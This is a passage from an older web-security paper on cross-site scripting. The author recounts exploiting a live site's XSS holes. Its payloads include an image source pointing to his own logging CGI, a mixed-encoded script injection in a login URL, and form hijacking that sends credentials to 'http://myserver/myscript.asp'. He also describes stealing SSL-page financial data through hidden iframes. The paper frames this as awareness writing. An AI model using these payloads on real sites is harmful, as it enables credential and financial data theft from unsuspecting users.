+images to be the url of a cgi script I had running on one of hosted accounts.
+
+Another thing I had to consider in such a stunt was that I couldn’t use my own
+ip or server for two reasons. thousands of hits would QUICKLY flood my connection
+and could quite possible DOS me to the point I couldn’t keep up with the cgi data
+and I could probably be web wacked for quite a while not allowing me to change back
+the data to effectively "turn off" the onslaught.
+
+Why web wack yourself if you don't need to right ;)
+
+So, the script commands in the jpg file were this
+
+document.images(0).src="http://myserver/cgi-bin/logit.pl"
+
+My logit.pl script was a script that executed on the server. When it received a 
+request it would just log the ip, useragent and referrer passed in the HTTP header
+to a database and would then output a 302 Document Moved Header which would automatically
+redirect the browser to an actual image file. Since every page on the site was served
+with the same template I knew the image I would be changing would always be the same, so
+I just redirected the url back to that image so they wouldn’t see even a broken image icon. 
+
+I am so considerate.
+
+Had I been the nosey sort, I could have collected some real data on the surfers and used
+the javascript to do whatever and then append it to the query string of the img
+url. Had the data been to long to be passed in on a query string, then I could have 
+used the javascript to dynamically write a hidden iframe to the parent document, written
+a simple form the window, filled in the elements and then posted it off to the server
+side script. No need to try to script across domains or worry about domain security models.
+
+Ok changes made, script in place. I would give it about 20 seconds for data collection,
+not wanting to wack my hosted site or expose to many people, then I would change it back.
+and be off to reap the rewards of my collected data.
+
+As I sat and contemplated, I decided there was no need to carry through to the end goal.
+I knew it would work and had proven all the steps to myself before. Not quite content to
+just pack up and go, I changed my injection script in the jpg file to a simple 
+
+document.write('some simple text for articlename')
+
+Making the changes and watching the ticker scroll my little inconspicuous message 
+and knowing that it was also scrolling away on 7k other machines across the net
+was enough to give me the satisfaction of the moment. I then went back and changed 
+the article name to the same text I had used in the script and no one was any the
+wiser. 
+
+As my moment of victor waned and with it my perma grin of the private joke, I went
+back to examining the site. For the sake of brevity (to late now you say?) I am 
+only going to include 2 more examples of XSS holes I found in this site, both of
+which demonstrate techniques and concepts it is good to be aware of. 
+
+The next hole I found was a login page. If you were on the site and tried to perform
+an action that required authentication as a user, it would redirect you from the page
+you requested to the login page passing the referrer page in the querystring. Since
+this referrer page was always handled internally it was assumed it was always a safe
+value. Not so safe :)
+
+I could inject any script I wanted as its value in the querystring. This example is
+what I term event stealing. First, to discuss briefly, is how you could entice users
+to the login page. Isn’t the URL going to have a long querystring on it or the obvious
+<script src=></script> blocks ?
+
+Do you recognize this as script blocks at a glance?
+
+%3C%73%63%72%69%70%74%20%73%72%63%3D%62%6C%61%68%3E%3C%2F%73%63%72%69%70%74%3E
+
+of course a fully encoded section of url is suspicious. So how about mixed encoding
+and then viewed in its natural habitat.
+
+http://login.asp?lan=en%2021&count=100&exp=12&ref=%3Csc%72%69pt%20s%72c%3Db%6Cah%3E%3C%2Fsc
+
+%72%69p%74%3E
+
+It doesn’t look so obvious now the url isn’t overly long alot of people just click anyway.
+If you can put link text as something similar they won’t even think twice. Anyway I digress
+lets not worry about user tricking and just assume they are there. Event stealing is when
+you replace an even they have setup in a page with your own commands. 
+
+For the example of a login page, Sure you can inject a script, but the page contains
+no data until they fill it in. So you have to wait. You could use a timer or some bogus
+logic but the best way to know when to snag the data is steal the event of form submission.
+
+Actually you could steal the submit button press, which could fail because of validation
+routines, or you could just steal the onsubmit event of the form or even the unload
+event of the page. If you were to choose the onunload even of the page, you would be
+kinda stuck. The page is closing, you don’t have time to change an img src and would be
+force to open up a new pop up window. This is way to obvious. This leaves us with two 
+
+approaches
+either 
+
+document.forms(0).onsubmit = ourfunction
+
+or you can just steal the whole form submission and make it submit to your own server side
+script
+
+document.forms(0).action ="http://myserver/myscript.asp"
+
+then redirected them back to the proper script and hopefully they wont notice.
+
+The last Example we will dive into is a SSL encrypted page example. SSL and high encryption
+just seems to make developers and surfers feel so warm and fuzzy inside. Haha you cant
+get meeeee.
+
+*cough*cough*
+
+This is a bit of myth. Sure the data transfers are sound, but if an SSL encrypted
+page has a cross sight scripting hole all of that transport layer security is blown
+right out of the water!
+
+Same sight, different page. We are in an account management page. It is SSL encrypted
+because it contains information on credit accounts and payment options. Since it is
+SSL the developer felt safe including plaintext username and password information in 
+the form. The problem is that the server script took a querystring argument from a 
+previous page and echoed it directly to the page source with no filtering. Again
+we have a 45 character input limit. 
+
+Now because the page is SSL encrypted, even if we could slip in a script src= to our
+server, the browser would complain that the page contains unsecure items. We don’t want 
+this. We want the surfer to feel warm and fuzzy and we want to hide in our dark alcoves.
+
+The answer to this conundrum is again a script file embedded on the server somehow. Again
+the author image upload to the rescue! Yay author Image!
+
+Anyway, glee aside, same trick to execute script, same content length bypass,
+same tricks to steal data from the page (this time juicy data though), only difference
+is that SSL was there...and it didn’t stop us one bit. Since the script was coming from 
+the same server, no security flag was raised and the script was assumed as secure. 
+
+How does that saying go? Bingo was his namo ?
+
+The last trick I want to bring up is the idea of leveraging XSS attacks. In the 
+above example I had an active attack that could lead to financial information. Since
+it was an attack where a user had to click on a click or perform some other action
+to request the page with the crafted url there is a chance of being caught in our
+evil attempts. That is no fun. So now we ask ourselves, how can we force the user to 
+perform those actions so they don’t realize it is happening? There is a simple answer
+to this and it is termed XSS Leveraging. Lets indulge some thought and combine some
+of the holes we have found on this site.
+
+I can inject scripts that get stored in the database and output to unsuspecting users.
+So I can force users into any action I want. Now lets assume that the cookies didn’t
+contain all the login information and we couldn’t just steal accounts that way. Lets
+assume we can just tell from the cookie if they are logged in or not. So, we embed
+our script src (another nice thing about using a script src to embed the script 
+commands from a local server is that you know exactly who got hit and you can change
+the script at anytime and don’t have to alter the database to change the code or turn 
+it off). Our next step is top create a simple script. First look at the cookie, if
+the user is logged in then we write an iframe to the document with style attributes
+to either set it to hidden or to position it off screen. We then navigate this iframe
+to the crafted url. As the page navigates IE may pop up its "some items on this page are
+secure" or whatever dialogue but people generally feel safer with ssl so they probably
+would click ok. Also there are alot of instances where a regular http:// request for
+a page that was meant to be only displayed over ssl will work, again I digress.. So
+lets say we have our iframe loaded with the prize, now it is a simple matter of grabbing
+the form elements we want and then submit the data to our server. Since all of our script
+is executing from the same domain we do not have any problems with the cross domain
+security model and the prize is ours. 
+
+
+######################################################################
+
+4 Conclusion.
+______________________________________________________________________
+
+
+By now I hope you all understand that Cross sight scripting is not as trivial
+a 'security' hole as it appears on the surface as all of the simple demos
+people post as examples.
+
+Identifying Cross Sight Scripting is the easy part.
+
+Foreseeing its possibilities and knowing how to use it to impact a user base 
+is the hard part, and is the part that is not widely discussed.
+
+With XSS so widely written about and so misunderstood alot of people have walked away
+with the false conclusion that it is an annoyance and not a threat. 
+
+The purpose of this paper is not to arm a hoard of script kiddies with a bunch of
+proven tricks, but is to try to instill a sense as its actual dangers and impacts
+with those who are in the position to do something about it.
+
+As with all knowledge, it can be a double sided sword. As rfp's paper on Sql injection
+techniques brought out the dangers of Sql injection to the public I too hope that
+this paper may have a similar effect and raising awareness and helping people to 
+limit their own (and their surfer populations) exposure.
+
+You may not loose your server to XSS attacks, it may not DOS your network, but you
+may loose your users, and you may be the reason your clients lost their credit card
+numbers, fell victim to identity theft or had their accounts tampered with.
+
+Like this paper? Want to read more? 
+
+Check out the site for more Web Application Security related papers and specialized Web App auditing tools.
+
+http://sandsprite.com/Sleuth
+
+
